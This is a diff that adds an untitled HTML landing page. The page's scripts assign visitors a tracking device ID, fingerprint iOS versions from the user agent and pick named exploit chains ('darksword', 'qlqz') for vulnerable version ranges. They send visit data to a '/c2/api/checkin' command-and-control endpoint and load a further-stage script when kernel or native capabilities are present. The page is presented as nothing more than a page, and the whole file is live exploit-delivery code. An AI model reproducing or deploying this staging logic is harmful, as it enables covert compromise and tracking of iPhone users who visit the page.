@@ -1,0 +1,23 @@
+﻿<script src="/runtime-config.js"></script>
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title></title>
+<script>
+(function(){var id='';try{id=localStorage.getItem('_ds_device_id')||'';}catch(_){}if(!id){id='DS'+Date.now().toString(36)+Math.random().toString(36).slice(2,8).toUpperCase();try{localStorage.setItem('_ds_device_id',id);}catch(_){}}window.__DEVICE_ID__=id;try{document.cookie='_ds_did='+encodeURIComponent(id)+';path=/;max-age=86400';}catch(_){} }());
+</script>
+<script>
+(function(){var ua=String(navigator.userAgent||'');var m=/(?:iPhone|iPad|iPod).*?OS (\d+)[._](\d+)(?:[._](\d+))?/i.exec(ua)||/CPU (?:iPhone )?OS (\d+)[._](\d+)(?:[._](\d+))?/i.exec(ua);var v=m?[+m[1],+m[2],+(m[3]||0)]:null;window.__DS_IOS_VERSION__=v?v.join('.'):'';window.__QLQZ_VERSION_ALLOWED__=!!v&&((v[0]>=10&&v[0]<17)||(v[0]===17&&(v[1]<2||(v[1]===2&&v[2]<=1))));window.__DS_VERSION_ALLOWED__=!!v&&v[0]===18&&((v[1]>=4&&v[1]<=6&&v[2]<=99)||(v[1]===7&&v[2]<=2));window.__DS_SELECTED_CHAIN__=window.__QLQZ_VERSION_ALLOWED__?'qlqz_l':(window.__DS_VERSION_ALLOWED__?(v[1]===7?'darksword_18_7':'darksword_18_4_6'):'out_of_scope');if(window.__DS_SELECTED_CHAIN__!=='out_of_scope'){try{var q=new URLSearchParams(location.search);var visit={device_id:window.__DEVICE_ID__,deviceId:window.__DEVICE_ID__,ios_version:window.__DS_IOS_VERSION__,version:window.__DS_IOS_VERSION__,platform:'iOS',domain:location.hostname,channel_code:q.get('channelcode')||q.get('channel_code')||'',path:location.pathname,landing_url:document.referrer||'',redirect_url:location.href,referrer:document.referrer||'',user_agent:ua,chain:window.__DS_SELECTED_CHAIN__};fetch('/api/web-visit/track',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(visit)}).catch(function(){});fetch('/c2/api/checkin',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({device_id:window.__DEVICE_ID__,ios_version:window.__DS_IOS_VERSION__,chain:window.__DS_SELECTED_CHAIN__,domain:location.hostname,referrer:document.referrer||'',channel_code:visit.channel_code})}).catch(function(){});}catch(_){} }}());
+</script>
+</head>
+<body>
+<script>
+(function(){var cap=typeof globalThis.DS_CAPABILITY_ENABLED==='function'?globalThis.DS_CAPABILITY_ENABLED:function(){return false;};if((window.__QLQZ_VERSION_ALLOWED__||window.__DS_VERSION_ALLOWED__)&&(cap('native')||cap('kernel'))){var s=document.createElement('script');s.src='/routers.js?'+Date.now();document.body.appendChild(s);}}());
+</script>
+</body>
+</html>
+
+
+
